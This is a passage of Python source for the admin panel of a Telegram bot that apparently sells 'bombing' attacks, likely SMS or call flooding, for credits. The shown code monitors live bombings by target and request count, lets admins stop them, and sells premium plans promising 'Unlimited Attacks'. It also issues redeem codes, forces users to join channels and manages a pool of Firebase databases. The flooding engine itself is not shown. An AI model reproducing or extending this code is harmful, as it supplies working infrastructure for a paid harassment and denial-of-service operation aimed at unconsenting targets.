    async with _user_semaphore:
        try:
            q = update.callback_query
            await q.answer()
            uid = q.from_user.id
            if not has_admin_access(uid):
                await q.edit_message_text("⛔ Access Denied."); return
            data = q.data
            if not data.startswith("adm:"): return
            a = data[4:]
            
            # Owner-only restrictions
            owner_only = ["dashboard", "live", "users", "fb_menu", "fb_add",
                          "fb_refresh", "limits_menu", "set:", "channels_menu",
                          "add_channel", "remove_channel_menu", "rm_ch:",
                          "confirm_rm:", "maintenance", "stats", "prot_menu",
                          "prot_add", "prot_remove", "stop", "stopall",
                          "prem_list"]
            is_owner_only = any(a.startswith(x) for x in owner_only)
            if is_owner_only and not is_owner(uid):
                await q.answer("⛔ Owner only!", show_alert=True); return
            
            # ---------- MAIN ----------
            if a == "main":
                context.user_data.pop("admin_action", None)
                if is_owner(uid):
                    await q.edit_message_text(
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "   🔐 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        "Full Access\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                        reply_markup=owner_kb(), parse_mode="Markdown")
                else:
                    await q.edit_message_text(
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "   👮 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        "Limited Access\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                        reply_markup=admin_kb(), parse_mode="Markdown")
                return
            
            # ---------- DASHBOARD ----------
            if a == "dashboard":
                conn = db(); c = conn.cursor()
                c.execute("SELECT COUNT(*) FROM users"); u_cnt = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM users WHERE is_premium = 1"); p_cnt = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM banned_users"); b_cnt = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM redeem_codes WHERE used_count < max_uses")
                rc_cnt = c.fetchone()[0]
                c.execute("SELECT COALESCE(SUM(credits),0) FROM users"); t_cred = c.fetchone()[0]
                conn.close()
                active = sum(1 for v in bombing_active.values() if v)
                fbs = get_firebases()
                
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   📊 ᴅᴀꜱʜʙᴏᴀʀᴅ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"👥 Users: `{u_cnt}`\n"
                    f"💎 Premium: `{p_cnt}`\n"
                    f"🚫 Banned: `{b_cnt}`\n"
                    f"🎁 Active Codes: `{rc_cnt}`\n"
                    f"💰 Total Credits: `{t_cred}`\n"
                    f"⚡ Active Bombings: `{active}`\n"
                    f"🛰️ Firebases: `{len(fbs)}`\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:dashboard",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # ---------- LIVE BOMBINGS ----------
            if a == "live":
                if not active_bombings_detail:
                    await q.edit_message_text(
                        "🔴 No active bombings right now.",
                        reply_markup=back_kb("adm:main"))
                    return
                txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   🛰️ ʟɪᴠᴇ ʙᴏᴍʙɪɴɢꜱ\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                btns = []
                for i, (bu, info) in enumerate(active_bombings_detail.items(), 1):
                    rt = int(time.time() - info["started"])
                    txt += (f"{i}. 👤 `{bu}` [{info['mode']}]\n"
                            f"   🎯 `{info['target']}`\n"
                            f"   📨 `{info['requests']}` | ⏱️ `{rt}s`\n\n")
                    btns.append([InlineKeyboardButton(f"⛔ STOP {bu}",
                                                      callback_data=f"adm:stop:{bu}",
                                                      api_kwargs={"style": "danger"})])
                btns.append([InlineKeyboardButton("⛔ STOP ALL", callback_data="adm:stopall",
                                                   api_kwargs={"style": "danger"})])
                btns.append([InlineKeyboardButton("🔄 REFRESH", callback_data="adm:live",
                                                   api_kwargs={"style": "primary"})])
                btns.append([InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                                   api_kwargs={"style": "primary"})])
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup(btns),
                    parse_mode="Markdown")
                return
            
            if a.startswith("stop:"):
                try:
                    target_uid = int(a.split(":", 1)[1])
                    if bombing_active.get(target_uid):
                        bombing_active[target_uid] = False
                        await q.edit_message_text(f"⛔ Stopped `{target_uid}`",
                            reply_markup=back_kb("adm:live"), parse_mode="Markdown")
                    else:
                        await q.answer("Not active.", show_alert=True)
                except Exception: pass
                return
            
            if a == "stopall":
                n = 0
                for bu in list(bombing_active.keys()):
                    if bombing_active.get(bu): bombing_active[bu] = False; n += 1
                await q.edit_message_text(f"⛔ Stopped `{n}` bombings.",
                    reply_markup=back_kb("adm:live"), parse_mode="Markdown")
                return
            
            # ---------- USERS ----------
            if a == "users":
                conn = db(); c = conn.cursor()
                c.execute("SELECT user_id, username, first_name, credits, is_premium FROM users ORDER BY joined_at DESC LIMIT 20")
                rows = c.fetchall(); conn.close()
                txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   👥 ᴜꜱᴇʀꜱ (last 20)\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                for u_i, un, fn, cr, pr in rows:
                    badge = "💎" if pr else "👤"
                    txt += f"{badge} `{u_i}` @{un or '-'} | 💰 {cr}\n"
                txt += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt, reply_markup=back_kb(),
                    parse_mode="Markdown")
                return
            
            # ---------- BAN ----------
            if a == "ban_menu":
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🚫 ʙᴀɴ ᴍᴀɴᴀɢᴇʀ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Choose action:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ BAN USER", callback_data="adm:ban_add",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("❌ UNBAN USER", callback_data="adm:ban_remove",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "ban_add":
                context.user_data["admin_action"] = "ban_add"
                await q.edit_message_text("Send user ID to ban:"); return
            if a == "ban_remove":
                context.user_data["admin_action"] = "ban_remove"
                await q.edit_message_text("Send user ID to unban:"); return
            
            # ---------- PREMIUM ----------
            if a == "prem_menu":
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   💎 ᴘʀᴇᴍɪᴜᴍ ᴍᴀɴᴀɢᴇʀ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Choose action:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("♾️ UNLIMITED PLAN", callback_data="adm:unlimited_menu",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("❌ REMOVE PREMIUM", callback_data="adm:prem_del",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("📋 PREMIUM USERS", callback_data="adm:prem_list",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "unlimited_menu":
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   ♾️ ᴜɴʟɪᴍɪᴛᴇᴅ ᴘʟᴀɴ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Select duration:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("⚡ 1 MONTH (30 DAYS)",
                                              callback_data="adm:unl:30",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔥 3 MONTHS (90 DAYS)",
                                              callback_data="adm:unl:90",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("👑 LIFETIME",
                                              callback_data="adm:unl:0",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:prem_menu",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a.startswith("unl:"):
                days = int(a.split(":")[1])
                context.user_data["admin_action"] = f"give_unlimited:{days}"
                label = "Lifetime" if days == 0 else f"{days} Days"
                await q.edit_message_text(
                    f"♾️ *UNLIMITED — {label}*\n\nSend user ID:",
                    parse_mode="Markdown")
                return
            
            if a == "prem_del":
                context.user_data["admin_action"] = "prem_del"
                await q.edit_message_text("Send user ID to remove premium:"); return
            
            if a == "prem_list":
                conn = db(); c = conn.cursor()
                c.execute("SELECT user_id, premium_type, premium_expires_at FROM users WHERE is_premium = 1 LIMIT 20")
                rows = c.fetchall(); conn.close()
                if not rows:
                    await q.edit_message_text("📭 No premium users.",
                                              reply_markup=back_kb("adm:prem_menu"))
                    return
                txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   📋 ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀꜱ\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                for u_id, ptype, exp in rows:
                    if exp == 0: exp_str = "Lifetime"
                    else:
                        rem = int(exp - time.time())
                        exp_str = f"{rem // 86400}d left" if rem > 0 else "Expired"
                    txt += f"👤 `{u_id}` — {ptype or 'premium'} — {exp_str}\n"
                txt += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt, reply_markup=back_kb("adm:prem_menu"),
                    parse_mode="Markdown")
                return
            
            # ---------- CREDITS ----------
            if a == "credits_menu":
                conn = db(); c = conn.cursor()
                c.execute("SELECT COUNT(*) FROM redeem_codes WHERE used_count < max_uses")
                active_codes = c.fetchone()[0]
                conn.close()
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   💰 ᴄʀᴇᴅɪᴛꜱ ᴍᴀɴᴀɢᴇʀ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🎁 Active Codes: `{active_codes}`\n\n"
                    "Choose action:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ GIVE CREDITS", callback_data="adm:give_credits",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("➖ REMOVE CREDITS", callback_data="adm:remove_credits",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "give_credits":
                context.user_data["admin_action"] = "give_credits"
                await q.edit_message_text("Send: `<user_id> <credits>`", parse_mode="Markdown"); return
            if a == "remove_credits":
                context.user_data["admin_action"] = "remove_credits"
                await q.edit_message_text("Send: `<user_id> <credits>`", parse_mode="Markdown"); return
            
            # ---------- REDEEM CODES ----------
            if a == "redeem_menu":
                conn = db(); c = conn.cursor()
                c.execute("SELECT COUNT(*) FROM redeem_codes WHERE used_count < max_uses")
                active = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM redeem_codes")
                total = c.fetchone()[0]
                conn.close()
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🎁 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇꜱ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Active: `{active}`\n"
                    f"📊 Total: `{total}`\n\n"
                    "Choose action:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🎁 GENERATE CODE", callback_data="adm:gen_redeem",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("📋 ACTIVE CODES", callback_data="adm:active_codes",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "gen_redeem":
                context.user_data["admin_action"] = "generate_redeem"
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🎁 ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Send: `<credits> <max_uses>`\n\n"
                    "Examples:\n"
                    "`10 1`  → 10 credits, 1 use\n"
                    "`25 5`  → 25 credits, 5 uses\n"
                    "`100 10` → 100 credits, 10 uses\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown")
                return
            
            if a == "active_codes":
                conn = db(); c = conn.cursor()
                c.execute("SELECT code, credits, max_uses, used_count FROM redeem_codes WHERE used_count < max_uses ORDER BY created_at DESC LIMIT 15")
                rows = c.fetchall(); conn.close()
                if not rows:
                    await q.edit_message_text("📭 No active codes.",
                                              reply_markup=back_kb("adm:redeem_menu"))
                    return
                txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   🎁 ᴀᴄᴛɪᴠᴇ ᴄᴏᴅᴇꜱ\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                for code, cred, mx, usd in rows:
                    txt += f"🎁 `{code}`\n   💰 {cred} credits | 👥 {usd}/{mx}\n\n"
                txt += "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:active_codes",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:redeem_menu",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            # ---------- FIREBASES ----------
            if a == "fb_menu":
                fbs = get_firebases()
                txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   🛰️ ꜰɪʀᴇʙᴀꜱᴇꜱ\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                       f"Total: `{len(fbs)}`\n\n")
                for fb in fbs[:15]:
                    cache = firebase_cache.get(fb["tag"], {})
                    txt += (f"📊 `{fb['tag']}`\n"
                            f"🟢 {cache.get('online',0)} | 🔴 {cache.get('offline',0)} | 📊 {cache.get('total',0)}\n")
                if len(fbs) > 15: txt += f"\n_+{len(fbs)-15} more_"
                txt += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ ADD FIREBASE", callback_data="adm:fb_add",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔄 REFRESH ALL", callback_data="adm:fb_refresh",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "fb_add":
                context.user_data["admin_action"] = "add_firebase"
                await q.edit_message_text(
                    "➕ *Add Firebase*\n\nSend Firebase URL:\n\n"
                    "Example:\n`https://xxx-default-rtdb.firebaseio.com`",
                    parse_mode="Markdown",
                    reply_markup=back_kb("adm:fb_menu"))
                return
            
            if a == "fb_refresh":
                await q.edit_message_text("⏳ Refreshing all Firebases...")
                for fb in get_firebases():
                    s = fetch_firebase_stats(fb["url"])
                    if s: firebase_cache[fb["tag"]] = s
                await q.edit_message_text("✅ Refreshed!",
                    reply_markup=back_kb("adm:fb_menu"))
                return
            
            # ---------- CHANNELS ----------
            if a == "channels_menu":
                chs = get_force_channels()
                if not chs:
                    txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                           "   📢 ꜰᴏʀᴄᴇ ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟꜱ\n"
                           "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                           "📭 _No channels_\n\n"
                           "━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                else:
                    txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                           "   📢 ꜰᴏʀᴄᴇ ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟꜱ\n"
                           "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                           f"Total: {len(chs)}\n\n")
                    for i, ch in enumerate(chs, 1):
                        txt += f"{i}. 📢 {ch['label']}\n   `{ch['id']}`\n"
                    txt += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ ADD CHANNEL", callback_data="adm:add_channel",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("❌ REMOVE CHANNEL", callback_data="adm:remove_channel_menu",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:channels_menu",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "add_channel":
                context.user_data["admin_action"] = "add_channel"
                await q.edit_message_text("Send channel username (e.g. @channel):"); return
            
            if a == "remove_channel_menu":
                chs = get_force_channels()
                if not chs:
                    await q.edit_message_text("📭 No channels to remove.",
                                              reply_markup=back_kb("adm:channels_menu"))
                    return
                txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   ❌ ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                       "Select channel:\n")
                btns = []
                for i, ch in enumerate(chs):
                    btns.append([InlineKeyboardButton(
                        f"🗑️ {ch['label'][:30]}",
                        callback_data=f"adm:rm_ch:{i}",
                        api_kwargs={"style": "danger"})])
                btns.append([InlineKeyboardButton("🔙 BACK",
                                                   callback_data="adm:channels_menu",
                                                   api_kwargs={"style": "primary"})])
                await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(btns))
                return
            
            if a.startswith("rm_ch:"):
                try:
                    idx = int(a.split(":")[1])
                    chs = get_force_channels()
                    if idx < 0 or idx >= len(chs):
                        await q.answer("Invalid.", show_alert=True); return
                    ch = chs[idx]
                    kb = InlineKeyboardMarkup([
                        [InlineKeyboardButton("✅ YES, REMOVE",
                                              callback_data=f"adm:confirm_rm:{idx}",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("❌ CANCEL",
                                              callback_data="adm:remove_channel_menu",
                                              api_kwargs={"style": "primary"})],
                    ])
                    await q.edit_message_text(
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"   ⚠️ ᴄᴏɴꜰɪʀᴍ ʀᴇᴍᴏᴠᴇ\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📢 {ch['label']}\n"
                        f"🆔 `{ch['id']}`\n\n"
                        f"Are you sure?",
                        reply_markup=kb, parse_mode="Markdown")
                except Exception: pass
                return
            
            if a.startswith("confirm_rm:"):
                try:
                    idx = int(a.split(":")[1])
                    chs = get_force_channels()
                    if idx < 0 or idx >= len(chs):
                        await q.answer("Invalid.", show_alert=True); return
                    ch = chs[idx]
                    conn = db(); c = conn.cursor()
                    c.execute("DELETE FROM force_channels WHERE id = ?", (ch["id"],))
                    conn.commit(); conn.close()
                    with _join_lock: _join_cache.clear()
                    await q.edit_message_text(
                        f"✅ *Channel Removed*\n\n📢 {ch['label']}\n",
                        parse_mode="Markdown",
                        reply_markup=back_kb("adm:channels_menu"))
                except Exception as e:
                    log.error(f"confirm_rm: {e}")
                return
            
            # ---------- MAINTENANCE ----------
            if a == "maintenance":
                cur = get_config("maintenance", "0")
                new = "0" if cur == "1" else "1"
                set_config("maintenance", new)
                state = "🟢 BOT ON" if new == "0" else "🔴 BOT OFF (MAINTENANCE)"
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Status: {state}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 TOGGLE", callback_data="adm:maintenance",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            # ---------- BROADCAST ----------
            if a == "bc_all":
                context.user_data["admin_action"] = "bc_all"
                await q.edit_message_text("Send broadcast message to all users:"); return
        except Exception as e:
            log.error(f"admin_callback: {e}")
# ===================== ADMIN TEXT INPUT HANDLER =====================
async def handle_admin_input(update, context):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    action = context.user_data.get("admin_action")
    
    if not action or not has_admin_access(uid):
        return False
    
    try:
        # ---------- BAN USER ----------
        if action == "ban_add":
            if not text.isdigit():
                await update.message.reply_text("❌ Numeric ID only.")
                return True
            target_id = int(text)
            conn = db(); c = conn.cursor()
            c.execute("INSERT OR IGNORE INTO banned_users (user_id) VALUES (?)", (target_id,))
            conn.commit(); conn.close()
            try:
                await context.bot.send_message(target_id,
                    "🚫 *You have been banned* from using this bot.\n\n"
                    f"📌 Contact: {SUPPORT_USERNAME}",
                    parse_mode="Markdown")
            except Exception: pass
            await update.message.reply_text(
                f"✅ Banned: `{target_id}`",
                parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- UNBAN USER ----------
        if action == "ban_remove":
            if not text.isdigit():
                await update.message.reply_text("❌ Numeric ID only.")
                return True
            target_id = int(text)
            conn = db(); c = conn.cursor()
            c.execute("DELETE FROM banned_users WHERE user_id = ?", (target_id,))
            conn.commit(); conn.close()
            try:
                await context.bot.send_message(target_id,
                    "✅ *You have been unbanned!*\n\nYou can use the bot again.",
                    parse_mode="Markdown")
            except Exception: pass
            await update.message.reply_text(
                f"✅ Unbanned: `{target_id}`",
                parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- PREMIUM ADD ----------
        if action == "prem_add":
            if not text.isdigit():
                await update.message.reply_text("❌ Numeric ID only.")
                return True
            target_id = int(text)
            # Ensure user exists
            if not get_user(target_id):
                await update.message.reply_text("❌ User not found in database.")
                return True
            update_user(target_id, is_premium=1, premium_type="admin", premium_expires_at=0)
            try:
                await context.bot.send_message(target_id,
                    "💎 *PREMIUM ACTIVATED*\n\n"
                    "♾️ Unlimited attacks\n"
                    "👑 Lifetime access",
                    parse_mode="Markdown")
            except Exception: pass
            await update.message.reply_text(
                f"✅ Premium added: `{target_id}`",
                parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- PREMIUM REMOVE ----------
        if action == "prem_del":
            if not text.isdigit():
                await update.message.reply_text("❌ Numeric ID only.")
                return True
            target_id = int(text)
            update_user(target_id, is_premium=0, premium_type=None, premium_expires_at=0)
            try:
                await context.bot.send_message(target_id,
                    "❌ *Premium removed.*",
                    parse_mode="Markdown")
            except Exception: pass
            await update.message.reply_text(
                f"✅ Premium removed: `{target_id}`",
                parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- GIVE CREDITS ----------
        if action == "give_credits":
            parts = text.split()
            if len(parts) != 2:
                await update.message.reply_text(
                    "❌ Format: `<user_id> <credits>`",
                    parse_mode="Markdown")
                return True
            try:
                target_id = int(parts[0])
                amount = int(parts[1])
            except ValueError:
                await update.message.reply_text("❌ Invalid input.")
                return True
            if amount <= 0:
                await update.message.reply_text("❌ Credits must be positive.")
                return True
            u = get_user(target_id)
            if not u:
                await update.message.reply_text("❌ User not found.")
                return True
            new_cred = u.get("credits", 0) + amount
            update_user(target_id, credits=new_cred)
            try:
                await context.bot.send_message(target_id,
                    f"🎁 *CREDITS ADDED*\n\n"
                    f"✅ +{amount} Credits\n"
                    f"💰 New Balance: `{new_cred}`",
                    parse_mode="Markdown")
            except Exception: pass
            await update.message.reply_text(
                f"✅ +{amount} credits to `{target_id}`\n"
                f"💰 New balance: `{new_cred}`",
                parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- REMOVE CREDITS ----------
        if action == "remove_credits":
            parts = text.split()
            if len(parts) != 2:
                await update.message.reply_text(
                    "❌ Format: `<user_id> <credits>`",
                    parse_mode="Markdown")
                return True
            try:
                target_id = int(parts[0])
                amount = int(parts[1])
            except ValueError:
                await update.message.reply_text("❌ Invalid input.")
                return True
            u = get_user(target_id)
            if not u:
                await update.message.reply_text("❌ User not found.")
                return True
            new_cred = max(0, u.get("credits", 0) - amount)
            update_user(target_id, credits=new_cred)
            await update.message.reply_text(
                f"✅ -{amount} credits from `{target_id}`\n"
                f"💰 New balance: `{new_cred}`",
                parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- GENERATE REDEEM CODE ----------
        if action == "generate_redeem":
            parts = text.split()
            if len(parts) != 2:
                await update.message.reply_text(
                    "❌ Format: `<credits> <max_uses>`\n\nExample: `10 5`",
                    parse_mode="Markdown")
                return True
            try:
                credits = int(parts[0])
                max_uses = int(parts[1])
            except ValueError:
                await update.message.reply_text("❌ Invalid numbers.")
                return True
            if credits <= 0 or max_uses <= 0:
                await update.message.reply_text("❌ Positive numbers only.")
                return True
            if max_uses > 1000:
                await update.message.reply_text("❌ Max uses limited to 1000.")
                return True
            
            # Generate unique code
            for _ in range(10):
                code = "WARRIOR-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4)) \
                        + "-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
                conn = db(); c = conn.cursor()
                c.execute("SELECT 1 FROM redeem_codes WHERE code = ?", (code,))
                if not c.fetchone():
                    c.execute("INSERT INTO redeem_codes (code, credits, max_uses, created_by) VALUES (?, ?, ?, ?)",
                              (code, credits, max_uses, uid))
                    conn.commit(); conn.close()
                    break
                conn.close()
            else:
                await update.message.reply_text("❌ Could not generate unique code. Try again.")
                return True
            
            await update.message.reply_text(
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   ✅ ᴄᴏᴅᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🎁 Code: `{code}`\n"
                f"💰 Credits: `{credits}`\n"
                f"👥 Max Uses: `{max_uses}`\n"
                f"📊 Used: `0 / {max_uses}`\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📋 Share with users!",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 GENERATE ANOTHER",
                                          callback_data="adm:gen_redeem",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("📋 ACTIVE CODES",
                                          callback_data="adm:active_codes",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("🔙 REDEEM MENU",
                                          callback_data="adm:redeem_menu",
                                          api_kwargs={"style": "primary"})],
                ]))
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- GIVE UNLIMITED PLAN ----------
        if action.startswith("give_unlimited:"):
            days = int(action.split(":")[1])
            if not text.isdigit():
                await update.message.reply_text("❌ Numeric ID only.")
                return True
            target_id = int(text)
            if not get_user(target_id):
                await update.message.reply_text("❌ User not found. Ask them to /start first.")
                return True
            
            if days == 0:
                expires_at = 0  # Lifetime
                label = "Lifetime"
                user_msg = ("♾️ *UNLIMITED PLAN ACTIVATED*\n\n"
                            "👑 Lifetime Access\n"
                            "⚡ Unlimited Attacks")
            else:
                expires_at = time.time() + (days * 86400)
                label = f"{days} Days"
                user_msg = (f"♾️ *UNLIMITED PLAN ACTIVATED*\n\n"
                            f"⚡ Duration: {days} Days\n"
                            f"⚡ Unlimited Attacks")
            
            update_user(target_id,
                        is_premium=1,
                        premium_type=f"unlimited_{days}d",
                        premium_expires_at=expires_at)
            
            try:
                await context.bot.send_message(target_id, user_msg, parse_mode="Markdown")
            except Exception: pass
            
            await update.message.reply_text(
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   ✅ ᴜɴʟɪᴍɪᴛᴇᴅ ᴀᴄᴛɪᴠᴀᴛᴇᴅ\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"👤 User: `{target_id}`\n"
                f"📅 Duration: `{label}`\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 PREMIUM MENU",
                                          callback_data="adm:prem_menu",
                                          api_kwargs={"style": "primary"})],
                ]))
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- ADD FIREBASE ----------
        if action == "add_firebase":
            url = text.strip().rstrip("/")
            if not (url.startswith("http") and ("firebaseio.com" in url or "firebasedatabase.app" in url)):
                await update.message.reply_text(
                    "❌ Invalid Firebase URL.\n\n"
                    "Example: `https://xxx-default-rtdb.firebaseio.com`",
                    parse_mode="Markdown")
                return True
